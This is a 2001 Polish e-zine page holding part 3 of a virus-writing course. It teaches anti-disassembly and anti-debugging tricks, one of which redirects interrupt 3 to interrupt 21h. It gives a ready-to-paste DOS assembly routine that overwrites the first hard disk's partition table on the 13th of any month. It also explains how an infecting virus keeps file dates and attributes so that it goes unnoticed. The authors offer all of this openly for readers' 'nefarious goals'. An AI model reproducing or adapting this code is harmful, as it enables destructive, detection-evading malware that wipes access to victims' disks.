<html><head><meta http-equiv=Content-Type content="text/html; charset=iso-8859-2"><link rel=stylesheet href="magazin.css" TYPE="text/css"><title>MagaZin #3 :: sierpieñ 2001</title></head><body link=478DE7 vlink=478DE7 alink=478DE7 topmargin=0 bottommargin=0 bgcolor="#000000"><div align=center><center><table border=0 width=700 cellspacing=0 cellpadding=0 height=250 bgcolor="#FFFFFF"><tr><td width=697 height=154 valign=top><img border=0 src="../img/up.png" width=700 height=150></td></tr><tr><td width=697 height=1 valign=top><div align=center><center><table border=0 width="92%" cellspacing=0 cellpadding=4><tr><td width="10%"><a href="15.htm"><img border=0 src="../img/4.gif" width=50 height=25 align=right></a></td><td width="23%"><font face=Arial size=1>poprzednia</font></td><td width="33%"><p align=center><a href="spis.htm"><img border=0 src="../img/6.gif" width=200 height=20></a></td></center></center><td width="23%"><p align=right><font size=1 face=Arial>nastêpna</font></td><td width="10%"><a href="17.htm"><img border=0 src="../img/3.gif" width=50 height=25></a></td></tr></table></div></td></tr><center><tr><td width=697 height=83 valign=top><div align=center><center><table border=0 width="92%" height=1 cellspacing=10 cellpadding=2><tr><td width="100%" height=5 valign=top colspan=2></td></tr><tr><td width="100%" height=16 valign=top bgcolor="#000000" colspan=2><img border=0 src="../img/10.gif" width=225 height=14></td></tr><tr><td width="100%" height=1 valign=top colspan=2><font face=Arial size=2><br></font><div align=center><center><table border=0 width="100%" cellspacing=0 cellpadding=0><tr><td width="64%" valign=top height=30><font class=u>Kurs pisania wirusów, cz. 3</font></td></center></center></center><td width="36%" valign=top height=30><p align=right></td></tr></table></div><center><center></center></center></td></tr><tr><td width="50%" height=112 valign=top><p align=justify><font class=9pt><b>Wstêp</b><br><br>Wedle obietnicy w tym FAQ zajmiemy siê udoskonalaniem naszego kodu. Jego optymalizacj±, zabezpieczaniem przed debuggerami i disassemblerami Dodamy te¿ ciekaw± procedurê destrukcyjn±.<br><br><b>Disassemblery</b><br><br>Disassemblery s± to programy, które umo¿liwiaj± edycje naszego programu w kodzie ¼ród³owym, w assemblerze. Istniej± ró¿nego rodzaju disassemblery. Jedne s± bardziej, inne mniej inteligentne. Jak one dzia³aj±? Te mniej inteligentne posiadaj± po prostu zbiór komend i im odpowiadaj±cych kodów procesora. Nastêpnie prosto z góry na dó³ przetwarzaj± program wedle swojej bazy. Mo¿na w bardzo prosty sposób oszukaæ takie disassemblery wykorzystuj±c taka w³a¶ciwo¶æ procesora, ze ta sama liczba mo¿e byæ jakim¶ rozkazem, ale i mo¿e byæ równie¿ dana przekazywana do innego&nbsp;rozkazu. Zobaczmy to na przyk³adzie. Mamy program:<br><br><font color="#478DE7">MOV DX,OFFSET Napis<br> MOV AH,09H<br> INT 21H<br> RET<br> Napis DB "BINBOY &amp; MBR",13,10,'$'</font><br><br>Po skompilowaniu go kompilatorem A86 powstanie ma³y program, który wy¶wietla pewien napis. Jednak program ten mo¿na bardzo ³atwo disassemblowaæ. U¿yjemy dowolnego tego typu programu, np. HIEW i otrzymamy ¼ród³o. Na HIEW-a i inne ma³o inteligentne programy jest pewien bardzo prosty sposób. Zobaczmy:<br><br><font color="#478DE7">JMP ET2<br> DB 05H<br> ET2:<br> MOV DX,OFFSET Napis<br> MOV AH,09H<br> INT 21H<br> RET<br> Napis DB "BINBOY &amp; MBR",13,10,'$'</font><br><br>Powy¿szy program jest zabezpieczony przed disassemblacj±. Taka próba da³aby w efekcie nastêpuj±cy wynik (disassemblowano HIEW-em):<br><br><font color="#478DE7">JMP 04H<br> ADD AX,00CBA<br> ADD [SI][0CD09],SI<br> AND BX,AX<br> INC DX<br> DEC CX<br> DEC SI<br> INC DX<br> DEC DI<br> AND [04D20],AH<br> INC DX<br> PUSH DX<br> OR AX,0240A</font><br><br>Niczym ten program nie przypomina poprzedniego, jednak dzia³a tak samo. Dlaczego?? Ca³y trik jest w linijkach:<br><br><font color="#478DE7">JMP ET2<br> DB 05H<br> ET2:<br> MOV DX,OFFSET Napis</font><br><br>Wykonujemy skok do etykiety ET2. Tam wykonujemy normalnie polecenia. Program dzia³a poprawnie. Jednak disassembler przetwarzaj±c program nie wykona skoku, tylko pójdzie dalej. Zmiesza pusty bajt (05H) z instrukcj± MOV ... czego wynikiem jest powstanie dziwnej komendy. Komenda ta zajmuje mniej bajtów ni¿ nasza MOV... dlatego zosta³y zmieszane równie¿ nastêpne linijki programu.<br><br>To jest sposób na ma³o inteligentne programy. Te o bardziej zaawansowanym algorytmie nie daj± siê na to nabraæ. Podczas procesu disassemblacji wykonuj± tak jakby program. Przy JMP wykonuj± skok i disassembluj± dalej. Je¶li wiêc dany bajt nie jest nigdy wykonywany, nie zostanie równie¿ disassemblowany. Na takie programy jest jednak inny sposób. Bardziej z³o¿ony, ale efektywny. Spójrzmy na przyk³ad zabezpieczenia tego samego programu<br> innym sposobem:<br><br><font color="#478DE7">MOV BX,108H<br> MOV AL,0BAH<br> MOV CS:[BX],AL<br> DB 0AH,010H,01H<br> MOV AH,09H<br> INT 21H<br> RET<br> Napis DB "Karol",13,10,'$'</font><br><br>Powy¿szy program wy¶wietli znany nam napis. Jednak jego disassemblacja nie da po¿±danego efektu. Do jej wykonania u¿y³em ju¿ bardzo inteligentnego disassemblera ID. Oto, co on pokaza³:<br><br><font color="#478DE7">LB0100:<br> MOV BX,108H<br> MOV AL,0BAH<br> MOV BYTE PTR CS:[BX],AL<br> OR DL, BYTE PTR [BX+SI]<br> ADD WORD PTR LBCD09,SI<br> AND BX,AX<br> DEC BX<br> DB "arol",13,10,'$'</font><br><br>Z tego programu nie dowiemy siê co on robi. Nawet wy¶wietlany napis jest trochê inny. W kodzie tym jest nawet b³±d, to co otrzymali¶my nie da siê skompilowaæ, gdy¿ nieokre¶lona jest etykieta LBCD09. Jak to dzia³a??? Otó¿ instrukcja MOV DX,110H (offset wy¶wietlanego napisu) ma kod BA1001. My w programie napisali¶my 0A1001. Zmieniamy warto¶æ 0A na BA na pocz±tku, jednak disassemblery nie zmieniaj± i wykonuj± program. Wykonuj± tak, ¿e 0A zupe³nie zmienia kod programu. Powstaje co¶ zupe³nie innego. Jest na pewno jeszcze wiele innych metod zabezpieczania, jednak nie nadaj± siê one na t± czê¶æ FAQ. Mo¿e kiedy¶...<br><br><b>Debuggery</b><br><br>Debuggery s± to wzbogacone o dodatkowe funkcje disassemblery. Co prawda nabieraj± siê na te same sztuczki co pozosta³e, ale maja mo¿liwo¶æ wykonania programu krok po kroku, przez co wszystkie pu³apki zawodz±. Jednak wszystko ma swoje wady. Debuggery do pracy krokowej u¿ywaj± przerwania 3. Wstawiaj± je (w pamiêci) po ka¿dej instrukcji. Nastêpnie przechwytuj± i je kontroluj±. Dzia³a to w taki sposób, ze po wykonaniu ka¿dej instrukcji jest wykonywane (choæ tego nie widaæ) owo przerwanie, podczas którego zostaj± wy¶wietlone warto¶ci wszystkich rejestrów, itp. Dziêki temu, ze debuggery u¿ywaj± przerwania 3 mo¿na zabezpieczyæ wirusa przed debuggowaniem. Jak?? Jest bardzo prosty sposób. Wystarczy w wirusie zmieniæ adres przerwania 3h na przerwanie 21h. Nastêpnie w programie wszêdzie wywo³ywaæ przerwanie 3h zamiast 21h. Efekt bêdzie taki sam, jednak debugger musi zmieniæ adres przerwania 3h po to, by moc je kontrolowaæ. Je¶li je zmieni, to wirus nie bêdzie dzia³aæ poprawnie. Jak to uczyniæ? Do tego celu potrzebne nam bêd± dwie funkcje przerwania 21h. Jedna do zmiany adresu przerwania i druga do odczytania aktualnego adresu. Oto one:<br><br><font color="#478DE7">INT 21H<br> AH=x - X -numer funkcji</font><br><br><font color="#478DE7">AH=25H</font> - funkcja powoduje zmianê adresu procedury obs³ugi przerwania, którego numer podajemy w AL, na adres przekazany w DS:DX<br><br><font color="#478DE7">AH=35H</font> - funkcja powoduje sprawdzenie adresu procedury obs³ugi przerwania, którego numer równie¿ podajemy w AL i zapamiêtanie go w rejestrach ES:BX<br><br>Czyli pisz±c wirusa na pocz±tku mogliby¶my napisaæ taka wstawkê:<br><br><font color="#478DE7">MOV AX,3521H ; pobranie adresu przerwania 21H<br> INT 21H ; wynik w ES:BX<br> MOV AX,2503H ; zmiana adresu przerwania 3H na adres przerwania 21H<br> MOV DX,BX ; DX=BX<br> PUSH ES<br> POP DS ; DS=ES<br> INT 21H</font><br></font><td width="50%" height=93 valign=top><p align=justify><font class=9pt>Teraz w programie zamiast ka¿dej instrukcji INT 21H wpisujemy INT 3H. Ten sposób ma jeszcze jedna zaletê. Je¶li piszemy d³u¿szego wirusa, w którym wiele razy u¿ywamy przerwania 21H, to ten sposób jest pewnego rodzaju optymalizacj±. Otó¿ wykonanie przerwania, czyli instrukcja INT x, gdzie x jest numerem naszego przerwania zajmuje dwa bajty, czyli CDxx, gdzie xx, to wspomniane przerwanie. Jedynym wyj±tkiem jest przerwanie 3H, którego kod jest jedno bajtowy i wygl±da tak: CCH<br><br><b>Procedury destrukcyjne</b><br><br>Wirus poza tym, ¿e musi siê rozmna¿aæ, no, powiedzmy powielaæ swój kod, powinien tak¿e powodowaæ dodatkowe efekty. Niektóre wirusy ¶piewaj± piosenki, inne pokazuj± na ekranie jakie¶ efekty (np. spadaj±ce literki), a jeszcze inne od czasu do czasu cos... niszcz± :-). No i w³a¶nie taka niszcz±c± procedurkê sobie tutaj zaraz zrobimy. Bêdzie ona, je¶li wywo³ana 13-ego dnia dowolnego miesi±ca, zamazywaæ tablice partycji pierwszego dysku twardego. Co to oznacza, chyba wszyscy wiedza, a tym, którzy nie wiedza ju¿ wyja¶niam: DOS (ani oczywi¶cie Windows) nie bêdzie widzia³ ¿adnej partycji zawartej na tym dysku - efekt bêdzie taki, jakby komputer wcale nie mia³ twardego dysku.... Nie bêdziemy jednak a¿ tak brutalni, prawdziwa zawarto¶æ tablicy partycji zapamiêtamy w innym sektorze, tak, ze dysk bêdzie da³o siê uratowaæ. Do realizacji naszego nieetycznego planu potrzebne bêd± dwie funkcje przerwania 13h:<br><br>FUNKCJE PRZERWANIA 13h OBS£UGI DYSKÓW:<br><br><font color="#478DE7">Funkcja 02h: Odczytanie sektorów.<br> Parametry: AH = 02h<br> AL = liczba sektorów (max 128)<br> CH = numer cylindra<br> CL = numer pierwszego sektora<br> DH = numer g³owicy<br> DL = numer dysku<br> ES:BX = adres bufora<br> Wynik: AH - wynik operacji<br> AL - liczba sektorów, na których wykonano operacje<br> Je¶li ustawiony znacznik C to b³±d.<br><br>Funkcja 03h: Zapisanie sektorów.<br> Parametry: AH = 03h, reszta tak samo jak w funkcji 02h</font><br><br>¯eby nie by³o niejasno¶ci: BIOS widzi twardy dysk jako zbiór dysków magnetycznych, z których ka¿dy ma dwie strony (z wyj±tkiem dwóch zewnêtrznych) i ka¿dej stronie odpowiada jedna g³owica. Taki pojedynczy dysk dzieli siê na ¶cie¿ki (w opisie int 13h zwane cylindrami - nie jest to dok³adnie to samo, ale przy tym, czym siê tutaj zajmujemy mo¿na tak przyj±æ). No, a ¶cie¿ka dzieli siê na sektory po 512 bajtów. Tablica partycji zajmuje jeden sektor o numerze 0,0,1 (tzn. 0 g³owica, 0 cylinder, 1 sektor). Za tablica partycji jest kilka sektorów, których DOS nie wykorzystuje, wiec tam mo¿na cos przechowywaæ (np. wirusa), a w naszym przypadku tablice partycji, taka, jaka by³a przed zamazaniem - do tego celu wykorzystamy sektor 0,0,2. Jedna uwaga: to, ze DOS nie wykorzystuje tych kilku sektorów, nie oznacza, ¿e tak samo robi± inne systemy - taki Unix przechowuje tam jakie¶ swoje dane i jak mu je zamazaæ to siê wszystko skopie. No wiêc do roboty.<br><br><font color="#478DE7">zamazywanie_tablicy_partycji:<br><br>mov ah,2Ah ; funkcja DOS-u: pytanie o datê<br> int 21h ; powrót: CX - rok (liczony od 1980)<br> ; DH - miesi±c, DL - dzieñ<br> ; AL - dzieñ tygodnia (0=niedz. itd.)<br> cmp dl,13 ; czy 13-ty ??<br> jne dajemy_spokoj&nbsp;<br><br>mov ax,0201h ; odczytanie tablicy partycji do<br> mov bx,(offset bufor) ; bufora<br> mov cx,0001h&nbsp;<br> mov dx,0080h&nbsp;<br> int 13h&nbsp;<br> jc dajemy_spokoj ; CF=1 je¶li b³±d<br><br>mov ax,0301h ; zapis tablicy partycji do sektora<br> inc cl ; 0,0,2 - przerwanie 13h zmieni³o po<br> int 13h ; ostatniej operacji tylko warto¶æ AX<br> ; dlatego nie musimy ustawiaæ innych<br> ; rejestrów - za wyj±tkiem CL = numer<br> ; sektora<br> jc dajemy_spokoj&nbsp;<br><br>mov ax,0301h ; zapis do sektora 0,0,1 ¶mieci, a<br> dec cl ; dok³adniej bloku PSP naszego<br> xor bx,bx ; programu i jego pierwszych 256<br> int 13h ; bajtów, ale to nie wa¿ne...<br><br>dajemy_spokoj:<br> ret<br><br>bufor db 512 dup(0)</font><br><br>Tê procedurê mo¿na przepisaæ ¿ywcem do swojego wirusa i wywo³ywaæ tak:<br><br><font color="#478DE7">call zamazywanie_tablicy_partycji</font><br><br><b>Zapamiêtywanie/Odtwarzanie daty/atrybutów<br> zara¿anego pliku</b><br><br>¯eby wirusa by³o trudniej wykryæ, no i ¿eby by³ bardziej "elegancki", powinien on przed infekcja pliku zapamiêtywaæ datê i czas jego ostatniej modyfikacji, a tak¿e atrybuty, ¿eby moc je pó¼niej odtworzyæ. Zapamiêtywanie czasu ma tak¿e taka zaletê, ¿e wirus mo¿e nieznacznie zmieniæ oryginalny czas ostatniej modyfikacji pliku, ustawiaj±c np. liczbê sekund na 64, co pó¼niej pos³u¿y mu jako identyfikator plików ju¿ zara¿onych. Co do atrybutów, to niezale¿nie od tego, czy wirus je zapamiêtuje czy nie, przed prób± otwarcia pliku powinien on skasowaæ wszystkie atrybuty (mo¿e z wyj±tkiem Archive), gdy¿ wirus nie mo¿e nic zapisaæ do pliku z atrybutem ReadOnly.<br><br>Funkcje DOS-u do odczytu/zmiany atrybutów/daty pliku:<br><br><font color="#478DE7">Funkcja 43h: Odczytanie/zmiana atrybutów pliku.<br> Parametry: AH = 43h<br> AL = 0 - odczyt atrybutów, 1 - zmiana atrybutów<br> CX = nowe atrybuty (je¶li AL = 1)<br> DS:DX = adres nazwy pliku w kodzie ASCIIZ<br> Wynik: CX = atrybuty pliku (je¶li AL = 0)<br> Je¶li ustawiony znacznik C to b³±d.<br> Uwagi: Wirus powinien zmieniæ atrybuty pliku przed jego<br> otwarciem!<br> Znaczenie kolejnych bitów CX jest nastêpuj±ce:<br> 0 - plik tylko do odczytu<br> 1 - plik ukryty<br> 2 - plik systemowy<br> 3 - etykieta dysku<br> 4 - podkatalog<br> 5 - atrybut archiwalno¶ci<br> 6,7 - nie u¿ywane<br><br>Funkcja 57h: Odczytanie/zmiana daty ostatniej modyfikacji pliku.<br> Parametry: AH = 57h<br> AL = 0 - odczyt daty, 1 - zmiana daty<br> BX = uchwyt pliku (numer doj¶cia)<br> CX = czas do ustawienia (je¶li AL = 1)<br> DX = data do ustawienia (je¶li AL = 1)<br> Wynik: CX = czas ostatniej modyfikacji pliku (dla AL = 0)<br> DX = data ostatniej modyfikacji pliku (dla AL = 0)<br> Je¶li ustawiony znacznik C to b³±d.<br> Uwagi: Znaczenie kolejnych bitów CX i DX jest nastêpuj±ce:<br> DX: 9..15 - rok do 1980<br> 5..8 - miesi±c<br> 0..4 - dzieñ<br> CX: 11..15 - godzina<br> 5..10 - minuta<br> 0..4 - sekunda / 2</font><br><br><b>Zakoñczenie</b><br><br>Tak dobiegli¶my do koñca. My¶lê, ze informacje tutaj zawarte przydadz± siê do twoich niecnych celów. ;-)) W kolejnej (IV) czê¶ci FAQ zajmiemy siê wirusami plików typu BAT (przerobimy naszego wirusa z FAQ 1 tak, ¿eby zara¿a³ tez pliki BAT), oraz wirusami rezydentnymi - napiszemy najprostszego wirusa rezydentnego oraz rezydentn± procedurê destrukcyjn±.<br><br>Serdecznie zapraszam. I czekam na listy:&nbsp;<br><br>Dokoñczenie serialu o wirusach ju¿ w nastêpnym numerze, czyli w czê¶ci czwartej i ostatniej. Nie przegap najlepszego :)<br><br></font></tr><tr><td width="100%" height=1 valign=top colspan=2><p align=right><font class=9pt><b>Binboy &amp; MBR</b><br><a href="mailto:binboy@free.com.pl" class=link>binboy@free.com.pl</a> | <a href="http://binboy.koti.com.pl" class=link>binboy.koti.com.pl</a></font></tr><tr><td width="100%" height=1 valign=middle colspan=2 bgcolor="#000000"><b><font face=Verdana color="#FFFFFF" size=1>&nbsp;Copyright &copy; MagaZin 2001</font></b></td></tr></table><table border=0 width="92%" height=1 cellspacing=10 cellpadding=2><center></table></div></center></td></tr></table></div></body></html>